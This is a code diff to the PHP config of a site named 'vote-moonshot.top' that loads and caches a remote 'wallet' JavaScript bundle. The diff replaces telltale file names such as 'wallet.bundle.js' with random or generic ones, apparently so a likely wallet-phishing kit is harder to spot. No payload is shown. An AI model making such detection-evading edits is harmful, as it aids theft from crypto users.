@@ -18,7 +18,7 @@ $cfg = [
     'site_icons' => ['https://vote-moonshot.top/tYZq2BsVawvS5wYEF.svg'],
     'site_url' => 'https://vote-moonshot.top',
 
-    'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
+    'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/p7KqN2mR9vXw.js',
     'vercel_bundle_cache_seconds' => 300,
 
     'analytics' => false,
@@ -171,7 +171,7 @@ function assert_vercel_bundle_url(string $url): void
     }
     $path = (string) ($parts['path'] ?? '');
     if ($path === '' || $path === '/') {
-        throw new RuntimeException('vercel_bundle_url must include a path, e.g. /wallet.bundle.js');
+        throw new RuntimeException('vercel_bundle_url must include a path, e.g. /p7KqN2mR9vXw.js');
     }
 }
 
@@ -182,7 +182,7 @@ function fetch_vercel_bundle_cached(string $url, int $ttlSeconds): ?string
     if (!is_dir($cacheDir)) {
         mkdir($cacheDir, 0750, true);
     }
-    $cacheFile = $cacheDir . '/wallet.bundle.js';
+    $cacheFile = $cacheDir . '/bundle.cache.js';
     if (is_file($cacheFile) && (time() - filemtime($cacheFile)) < $ttlSeconds) {
         $cached = file_get_contents($cacheFile);
         if ($cached !== false && $cached !== '') {
